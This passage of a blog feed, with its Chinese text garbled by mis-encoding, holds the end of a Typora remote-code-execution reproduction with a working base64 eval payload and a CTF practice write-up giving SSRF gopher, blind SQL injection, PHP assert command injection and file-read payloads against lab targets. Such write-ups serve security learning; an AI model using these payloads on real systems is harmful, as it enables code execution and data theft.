class="string">&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ–°å»ºmdæ–‡ä»¶<br>å°†POCç²˜è´´å…¶ä¸­<br>æˆåŠŸæ‰§è¡Œå‘½ä»¤<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291350630.png"></p><h2 id="5-ä¿®å¤æ–¹æ¡ˆ"><a href="#5-ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="5.ä¿®å¤æ–¹æ¡ˆ"></a>5.ä¿®å¤æ–¹æ¡ˆ</h2><p>æ›´æ–°Typoraç‰ˆæœ¬è‡³1.6.7åŠä»¥ä¸Š</p><h2 id="6-å‚è€ƒæ–‡ç« "><a href="#6-å‚è€ƒæ–‡ç« " class="headerlink" title="6.å‚è€ƒæ–‡ç« "></a>6.å‚è€ƒæ–‡ç« </h2><p><a href="https://mp.weixin.qq.com/s/hMMqhVxx8YBokNrSM-__fQ">https://mp.weixin.qq.com/s/hMMqhVxx8YBokNrSM-__fQ -ä¿¡å®‰404</a></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ”»é˜²ä¸–ç•Œç»ƒä¹ -CTFå…¥é—¨(äºŒ)</title>
      <link href="/2023/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%BB%83%E4%B9%A0-CTF%E5%85%A5%E9%97%A8(%E4%BA%8C)/"/>
      <url>/2023/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%BB%83%E4%B9%A0-CTF%E5%85%A5%E9%97%A8(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="1-éš¾åº¦ä¸‰"><a href="#1-éš¾åº¦ä¸‰" class="headerlink" title="1.éš¾åº¦ä¸‰"></a>1.éš¾åº¦ä¸‰</h1><h2 id="1-very-easy-sql-NO-GFSJ1008"><a href="#1-very-easy-sql-NO-GFSJ1008" class="headerlink" title="1.very_easy_sql-NO.GFSJ1008"></a>1.very_easy_sql-NO.GFSJ1008</h2><p>è®¿é—®é¡µé¢åæœ‰è¾“å…¥æ¡†ï¼Œå°è¯•ä¸‡èƒ½ç™»é™†ä½†æ˜¯ç™»é™†å¤±è´¥<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171005998.png"></p><p>æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°æ³¨é‡Šä¸­å­˜åœ¨use.phpï¼Œè®¿é—®åæ˜¯ä¸€ä¸ªcurlæ¢æµ‹è¾“å…¥æ¡†<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171005580.png"><br>çŒœæµ‹éœ€è¦é…åˆSSRFï¼Œå°è¯•fileåè®®ï¼Œå‘ç°è¢«è¿‡æ»¤ï¼Œè¿”å›é¡µé¢ä¸ºnonono<br>å°è¯•<br>SSRF Gopheråè®®ä½¿ç”¨<br>æ„é€ gopher:&#x2F;&#x2F;åè®®æ•°æ®æµ<br>å…ˆå°è¯•è¯»å–index<br>çœ‹äº†å¤§ä½¬çš„wp,å°è¯•è‡ªå·±å†™</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python  </span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> urllib.parse  </span><br><span class="line">  </span><br><span class="line">target = <span class="string">&quot;127.0.0.1:80/&quot;</span>  </span><br><span class="line">content = <span class="string">&quot;uname=admin&amp;passwd=admin&quot;</span>  </span><br><span class="line">content_len = <span class="built_in">len</span>(content)  </span><br><span class="line">  </span><br><span class="line">req = \  </span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /index.php HTTP/1.1  </span></span><br><span class="line"><span class="string">HOST: 127.0.0.1  </span></span><br><span class="line"><span class="string">User-Agent: curl/7.43.0  </span></span><br><span class="line"><span class="string">Accept: */*  </span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded  </span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">&#123;&#125;  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(content_len,content)  </span><br><span class="line">  </span><br><span class="line">first = urllib.parse.quote(req)  </span><br><span class="line">tmp = first.replace(<span class="string">&quot;%0A&quot;</span>,<span class="string">&quot;%0D%0A&quot;</span>)  </span><br><span class="line">last = urllib.parse.quote(tmp)  </span><br><span class="line">res = <span class="string">&quot;gopher://&quot;</span>+target+<span class="string">&quot;_&quot;</span>+last  </span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>è¯·æ±‚ç»“æœ:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171537142.png"><br>å‘ç°å‡ºç°äº†base64çš„set-sookie<br>è§£å¯†åä¸º admin<br>å¾—çŸ¥è®¾ç½®cookieä¸ºadmin, ä½†æ˜¯è¿”å›é¡µé¢æ¥çœ‹å¹¶ä¸å­˜åœ¨adminç”¨æˆ·<br>æ¨æµ‹åå°å¯¹adminè¿›è¡Œäº†åˆ¤æ–­ï¼Œå¯èƒ½å­˜åœ¨æ³¨å…¥</p><p>cookieæ‰€åœ¨å¤„å¯è¢«æ³¨å…¥<br>å®˜æ–¹WP</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://61.147.171.105:64317/use.php?url=&quot;</span> </span><br><span class="line">flag = <span class="string">&quot;&quot;</span> </span><br><span class="line"><span class="comment">#ä»posä½æˆªå–</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="comment">#çˆ†ç ´æ¯ä¸€ä½ç»“æœ</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="comment"># poc=&quot;&#x27;) union select 1,2,if(1=1,sleep(5),1) # &quot; </span></span><br><span class="line">        <span class="comment"># security çˆ†åº“å</span></span><br><span class="line">        <span class="comment"># poc=&quot;&#x27;) union select 1,2,if(ascii( substr((database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot; </span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># flag çˆ†è¡¨å</span></span><br><span class="line">        <span class="comment"># poc=&quot;&#x27;) union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot; </span></span><br><span class="line"><span class="comment">#1-50ä½éƒ½æˆªå–ï¼Œè¿›è¡Œasciiæ¯”å¯¹ï¼Œå»¶æ—¶æ³¨å…¥çˆ†ç ´flag</span></span><br><span class="line">        poc = <span class="string">&quot;&#x27;) union select 1,2,if(ascii( substr((select * from flag),&quot;</span> + <span class="built_in">str</span>(pos) + <span class="string">&quot;,1) )=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,sleep(2),1) # &quot;</span> </span><br><span class="line">        bs = <span class="built_in">str</span>(base64.b64encode(poc.encode(<span class="string">&quot;utf-8&quot;</span>)), <span class="string">&quot;utf-8&quot;</span>) </span><br><span class="line">        <span class="comment">#POCæ„é€ åŒä¸Šï¼ŒåŠ ä¸Šcookieå‚æ•°ï¼Œcookieä½æ³¨å…¥ç‚¹</span></span><br><span class="line">        final_poc = <span class="string">&quot;gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D&quot;</span> + bs + <span class="string">&quot;%3B%250d%250a&quot;</span> </span><br><span class="line">        t1 = time.time() </span><br><span class="line">        res = requests.get(url + final_poc)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        <span class="comment">#å»¶æ—¶åˆ¤æ–­</span></span><br><span class="line">        <span class="keyword">if</span> (t2 - t1 &gt; <span class="number">2</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(flag) </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>çˆ†ç ´å‡ºflag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171624034.png"></p><h2 id="2-mfm-NO-GFSJ0415"><a href="#2-mfm-NO-GFSJ0415" class="headerlink" title="2.mfm-NO.GFSJ0415"></a>2.mfm-NO.GFSJ0415</h2><p>ç™»å½•è¿›åœºæ™¯åå‘ç°ä»¥pageä¸ºè®¿é—®ç´¢å¼•<br>å°è¯•ä¸‡èƒ½å–å‡ºï¼Œè¿”å›ä¸ºç©º<br>åœ¨è®¿é—®aboutæ—¶å‘ç°ä½¿ç”¨äº†git<br>çŒœæµ‹å­˜åœ¨gitæ³„éœ²</p><p>æˆåŠŸè®¿é—®.git<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171006731.png"></p><p>ä½¿ç”¨GitHackè·å–gitæºç <br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171006250.png"></p><p>ä¸‹è½½åçš„æºç é‡Œçš„flag.phpä¸ºç©ºï¼Œindex.phpè°ƒç”¨templatesæ–‡ä»¶å¤¹é‡Œçš„å››ä¸ªæ–‡ä»¶<br>å¯¹index.phpè¿›è¡Œä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- ä¼ å‚å¤„ç† --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#GETä¼ å…¥å‚æ•°page</span></span><br><span class="line"><span class="comment">#æ²¡æœ‰çš„è¯é»˜è®¤æŸ¥çœ‹home</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">Â  Â  <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">##å®šä¹‰$file</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="comment">#æŸ¥æ‰¾..ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</span></span><br><span class="line"><span class="comment">#or å¦‚æœç¬¬ä¸€ä¸ªæ˜¯å¯¹çš„ï¼Œæ€»å€¼ä¸ºçœŸï¼Œä¸ä¼šæ‰§è¡Œç¬¬äºŒä¸ª</span></span><br><span class="line"><span class="comment">#ç¬¬ä¸€æ¡è¯­å¥ å³$fileé‡Œæ²¡æœ‰..</span></span><br><span class="line"><span class="comment">#ç”±äºæ˜¯é€šè¿‡assertä¼ å…¥å­—ç¬¦ä¸²è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥æˆªæ–­å­—ç¬¦ä¸²ä»è€Œæ‰§è¡Œå…¶ä»–å‘½ä»¤</span></span><br><span class="line"><span class="comment">#$file=1&#x27;,&#x27;&#x27;) or system(&#x27;cat templates/flag.php&#x27;);//</span></span><br><span class="line"><span class="comment">#assert(&quot;strpos(&#x27; Â  Â  Â  1&#x27;,&#x27;&#x27;) or system(&#x27;cat templates/flag.php&#x27;);// Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  &#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="comment">#å¯¹$fileå­˜åœ¨æ€§è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœå­˜åœ¨å°±å¾€ä¸‹æ‰§è¡Œï¼Œä¸å­˜åœ¨è¾“å‡ºdieä¸­å†…å®¹</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ„é€ page</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,&#x27;&#x27;) or system(&#x27;cat templates/flag.php&#x27;);//</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹é¡µé¢æºç å¾—åˆ°flag</p><p>æ³¨æ„:åœ¨æˆªæ–­assertæ—¶æ— æ³•å°†asserté—­åˆå†å°†åé¢çš„å­—ç¬¦ä¸²æ³¨é‡Š</p><h2 id="3-lottery-NO-GFSJ0099"><a href="#3-lottery-NO-GFSJ0099" class="headerlink" title="3.lottery-NO.GFSJ0099"></a>3.lottery-NO.GFSJ0099</h2><p>ç‚¹å‡»ä¸‹è½½é™„ä»¶è·å–ç½‘é¡µæºç <br>è®¿é—®ç½‘ç«™,å‘ç°æ³¨å†Œåæ¯æ¬¡ä¹°å½©ç¥¨èŠ±è´¹2åˆ€,ä¸­äº†æ‰ä¼šè¿”å›é’±<br>èŠ±è´¹$9990000 å¯ä»¥ä¹°flag</p><p>æŸ¥çœ‹æºç <br>éšæœºç”Ÿæˆç»“æœ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_win_nums</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Â  Â  <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">Â  Â  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="variable">$result</span> .= <span class="title function_ invoke__">random_num</span>();</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è´­ä¹°å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">Â  Â  <span class="title function_ invoke__">require_registered</span>();</span><br><span class="line">Â  Â  <span class="title function_ invoke__">require_min_money</span>(<span class="number">2</span>);</span><br><span class="line">Â  Â  <span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">Â  Â  <span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">Â  Â  <span class="variable">$win_numbers</span> = <span class="title function_ invoke__">random_win_nums</span>();</span><br><span class="line">Â  Â  <span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">Â  Â  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">Â  Â  <span class="comment">#éå†æˆ‘ä»¬çŒœçš„æ¯ä¸€ä½å’Œç»“æœæ¯”å¯¹ï¼Œå¦‚æœç­‰äºåˆ™same_countåŠ 1</span></span><br><span class="line">Â  Â  <span class="comment">#å¯¹æ¯”æ–¹æ³•ç”¨çš„æ˜¯==è€Œä¸æ˜¯=== å¯èƒ½å­˜åœ¨æ¼æ´</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="variable">$same_count</span>++;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">default</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">Â  Â  <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">Â  Â  <span class="title function_ invoke__">response</span>([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨phpä¸­çœŸå€¼å’Œä»»ä¸€æ•°å­—æ¯”è¾ƒçš„å€¼å‡ä¸ºçœŸï¼Œ<br>æ‰€ä»¥æŠ“åŒ…ï¼Œå°†numbersæ”¹æˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;numbers&quot;:[true,true,true,true,true,true,true]</span><br></pre></td></tr></table></figure><p>æ¯”å¯¹åï¼Œæ‹¿åˆ°money<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181350628.png"><br>å¤šä¹°å‡ æ¬¡å°±å¯ä»¥è´­ä¹°flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181357728.png"></p><h2 id="4-simple-js-NO-GFSJ0480"><a href="#4-simple-js-NO-GFSJ0480" class="headerlink" title="4.simple_js-NO.GFSJ0480"></a>4.simple_js-NO.GFSJ0480</h2><p>è®¿é—®é¡µé¢ï¼Œéšä¾¿è¾“äº†ä¸ªå¯†ç ç™»é™†åæŸ¥çœ‹æºç </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);<span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;i = <span class="number">0</span>;j = tab.<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        k = j + (l) + (n=<span class="number">0</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        n = tab2.<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        o = tab[i-l];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        pass = p;<span class="keyword">return</span> pass;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Enter password&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>String[â€œfromCharCodeâ€]æ¥æ”¶Unicodeå€¼ï¼Œç»„åˆæˆä¸€ä¸ªæ–°å­—ç¬¦ä¸²<br>è§£ç String[â€œfromCharCodeâ€](dechiffre[])ä¸­çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²<br>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">55,56,54,79,115,69,114,116,107,49,50</span><br></pre></td></tr></table></figure><p>å¯¹æ¯”ASCIIè¡¨å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7,8,6,O,s,E,r,t,k,1,2</span><br></pre></td></tr></table></figure><p>çŒœæµ‹dechiffreé‡Œçš„passä¹Ÿæ˜¯ACSIIç¼–ç ï¼Œè§£å¯†åæ°æ˜¯FAUX PASSWORD HAHA<br>ä¸”å‡½æ•°ä¸ç®¡è¾“å…¥ä»€ä¹ˆä¸€ç›´è¿”å›pass-FAUX PASSWORD HAHA</p><p>é¢˜ç›®ç»™äº†flagçš„æ ¼å¼ä¸ºCyberpeace{xxxxxxxxx}<br>æ‰€ä»¥çŒœæµ‹flagå…¶å®æ˜¯Cyberpeace{786OsErtk12}<br>æˆåŠŸæäº¤</p><h2 id="5-ics-05-NO-GFSJ0332"><a href="#5-ics-05-NO-GFSJ0332" class="headerlink" title="5.ics-05-NO.GFSJ0332"></a>5.ics-05-NO.GFSJ0332</h2><p>è®¿é—®é¡µé¢æŸ¥äº†ä¸‹æºç ï¼Œå‘ç°åªæœ‰index.phpä¸€ä¸ªphpæ–‡ä»¶<br>è®¿é—®åç‚¹å‡»äº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181523046.png"><br>å°è¯•ç”¨pageå»è¯»index.php,ç›´æ¥è¯»ä¸è¡Œç”¨ä¼ªåè®®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61269/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>è§£ç å<br>å…¶ä¸­æœ‰preg_replace,å¯ä»¥å°è¯•ä½¿ç”¨&#x2F;&#x2F;eåŒ¹é…æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line">Â  Â  <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">Â  Â  <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">Â  Â  <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line">Â  Â  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">Â  Â  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">die</span>();</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 